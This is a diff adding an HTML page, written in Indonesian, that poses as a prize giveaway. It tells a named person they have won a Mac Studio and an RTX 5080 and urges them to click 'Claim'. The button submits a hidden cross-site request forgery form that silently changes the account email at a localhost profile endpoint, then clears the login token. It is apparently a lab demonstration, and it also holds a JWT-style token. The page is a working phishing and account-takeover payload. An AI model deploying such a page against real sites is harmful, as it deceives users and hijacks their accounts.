@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Giveaway</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
+  <style>
+    /* Reset Margin dan Padding */
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: Arial, sans-serif;
+      position: relative;
+    }
+
+    /* Background Image UNM */
+    body {
+      background: url('./bg.png') no-repeat center center fixed;
+      background-size: cover;
+    }
+
+    /* Gradiasi Transparan dengan Animasi Dinamis */
+    .gradient-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(45deg, #ff8c00, #ffb74d, #ff5722, #ff9800);
+      background-size: 400% 400%;
+      animation: gradientAnimation 15s ease infinite;
+      opacity: 0.3;
+      z-index: -1;
+    }
+
+    /* Animasi untuk Gradiasi Bergerak */
+    @keyframes gradientAnimation {
+      0% {
+        background-position: 0% 50%;
+      }
+      50% {
+        background-position: 100% 50%;
+      }
+      100% {
+        background-position: 0% 50%;
+      }
+    }
+    
+    .auth-container {
+      max-width: 400px;
+      width: 100%;
+      background: rgba(255, 255, 255, 0.9);
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      padding: 30px;
+      animation: fadeInUp 2.5s ease-out;
+    }
+
+    /* Header */
+    h1 {
+      color: #ff8c00;
+      font-size: 2rem;
+      margin-bottom: 20px;
+      font-weight: bold; /* Font tebal untuk header "ForXunm" */
+    }
+
+    /* Form Login & Register Title */
+    h3 {
+      font-size: 1.4rem;
+      font-weight: bold; /* Font tebal untuk judul Login/Register */
+    }
+
+    .btn-orange {
+      background-color: #ff8c00;
+      color: white;
+      transition: background-color 0.3s ease;
+    }
+
+    .btn-orange:hover {
+      background-color: #e57300;
+    }
+
+    .toggle-section {
+      margin-top: 10px;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #888;
+    }
+
+    .toggle-section span {
+      color: #ff8c00;
+      cursor: pointer;
+    }
+
+    /* Animasi FadeIn Up */
+    @keyframes fadeInUp {
+      0% {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .form-control:focus {
+      border-color: #ff8c00;
+      box-shadow: 0 0 5px #ff8c00;
+      background-color: #fff8e1;
+    }
+
+    .form-control {
+      background-color: #fff8e1;
+    }
+
+    /* Animasi untuk toast yang muncul dari atas */
+    .toast-container {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 9999;
+    }
+
+    /* Responsif */
+    @media (max-width: 768px) {
+      .auth-container {
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body class="d-flex align-items-center justify-content-center">
+
+  <!-- Gradiasi Layer Transparan -->
+  <div class="gradient-overlay"></div>
+
+  <!-- Auth Container -->
+  <div class="auth-container animate__animated animate__fadeInUp">
+    <h1 class="text-center">ForXunm</h1>
+    <!-- Form Serangan CSRF -->
+    <div id="csrfForm">
+      <h3 class="text-center mb-3">Kamu Mendapatkan Hadiah!</h3>
+      <div class="toggle-section">Selamat Sofyan Taurid Ode Madi,
+        Kamu mendapatkan Hadiah Mac Studio dan GeForce RTX 5080,
+        Claim hadiah sekarang dengan menekan tombol dibawah sekarang juga!</div>
+
+      <!-- Form otomatis yang langsung mengubah email -->
+      <form id="form-control" action="http://localhost:3000/api/update-profile" method="POST">
+        <input type="hidden" name="email" value="kiki@gmail.com"> <!-- Menganti secara diam diam -->
+        <input type="hidden" name="csrfToken" value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJzdG9tIiwiaWF0IjoxNzQyMzE0NDQwLCJleHAiOjE3NDIzMTgwNDB9.Vu6FbacQ18aYugPUwE2ddWpF83C5XkbwtocBUpSirXg"> <!-- Token CSRF yang valid -->
+
+        <!-- Tombol Claim yang langsung mengirim form -->
+        <button type="button" class="btn btn-orange w-100 mb-3" onclick="submitForm()">Claim</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    function submitForm() {
+      // Ambil nilai csrfToken dari localStorage atau cookie sesuai dengan aplikasi
+      const csrfToken = 'CSRF_TOKEN';  // Ganti dengan token CSRF yang valid
+
+      // Setel nilai csrfToken dalam form
+      document.querySelector('input[name="csrfToken"]').value = csrfToken;
+
+      // Submit form secara otomatis
+      document.getElementById('form-control').submit();
+
+      // Setelah mengirim form, lakukan logout
+      logout();
+    }
+
+    function logout() {
+      // Menghapus token login atau data session untuk logout
+      localStorage.removeItem('token');
+      // Redirect ke halaman login setelah logout
+      window.location.href = 'localhost:3000/auth.html';
+    }
+  </script>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
